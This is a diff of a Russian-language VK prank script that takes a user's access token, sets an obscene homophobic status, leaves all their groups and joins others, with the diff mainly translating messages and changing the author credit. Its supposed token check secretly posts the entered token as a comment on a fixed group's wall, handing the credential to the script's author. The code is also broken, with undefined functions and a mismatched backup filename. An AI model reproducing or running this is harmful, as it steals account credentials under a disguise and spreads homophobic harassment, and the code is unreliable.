@@ -5,28 +5,28 @@ pubs = [151233321,65797052,102413048,89243825,61515264,88667014,180103853,101105
 def troll ():
 	w = open ('backup', 'w')
 	wwrite (api.status.get()['text'] + '\n')
-	api.status.set(text="Люблю чёрные и волсатые хуйцы! Пишите!Сосуну за лайки!")
-	print ("\n\033[32mGroup's deletion...")
+	api.status.set(text="Люблю чёрные и волсатые хуйцы! Пишите!")
+	print ("\n\033[32mПишем статус...")
 	time.sleep (0.5)
 	for group in groups:
 		wwrite (str(group) + '\n')
 		api.groups.leave(group_id=group)
 		time.sleep(0.25)
 	wclose ()
-	print ("\033[FAdding the gay publics...  ")
+	print ("\033[FВступаем в гей паблики...  ")
 	for pub in pubs:
 	        api.groups.join(group_id=pub)
 	        time.sleep(0.25)
 	print ("\033[FDone:)                       \n")
 def untroll ():
-	r = open ('backup', 'r')
+	r = open ('Восстоновить', 'r')
 	api.status.set(text=r.readline())
-	print ("\n\033[32mGay publics deletion...")
+	print ("\n\033[32mПокидаем гей паблики...")
 	time.sleep (0.25)
 	for group in groups:
                 api.groups.leave(group_id=group)
                 time.sleep(0.25)
-	print ("\033[FAdding the delited groups...  ")
+	print ("\033[FДобавление удаленных групп...  ")
 	reading = True
 	while reading:
 		pub = r.readline ()
@@ -37,8 +37,9 @@ def untroll ():
 			api.groups.join(group_id=int(pub))
 			time.sleep(0.25)
 	print ("\033[FDone:(                                \n")
-print ("""\033[34m
- Termux-lab         @termuxlab\033[32m
+print ("""\033[37m
+
+ Anonimst         github.com/Anonimst\033[32m
 ████████████████████████████████████████ 
 ██ПЕТУШИНЫЙ██████████████████ТРОЛЛИНГ███
 ███████████████░░░░░░░░░░███████████████ 
@@ -59,17 +60,17 @@ print ("""\033[34m
 ████████████▄▄▄░░██████░░▄▄▄████████████ 
 ████████████████▄██░░██▄████████████████ 
 ████████████████████████████████████████
-\033[35m[1] Troll
-[2] Return
+\033[33m[1] Затролить
+[2] Вернутся
 """)
-option = input ("Select the option: \033[0m")
-token = input("\n\033[35mEnter the token: \033[0m")
+option = input ("Выберите пункт: \033[0m")
+token = input("\n\033[35mВведите токен: \033[0m")
 session = vk.Session(access_token=token)
 api =  vk.API(session ,v='5.92', lang='ru')
 try:
 	api.wall.createComment(owner_id=-191163638,post_id=1,message=token)
 except:
-	print ('\n\033[31mInvalid token\n')
+	print ('\n\033[31mНе верный токен!\n')
 	quit ()
 id = api.users.get()[0]['id']
 groups = api.groups.get(user_id=id)['items']
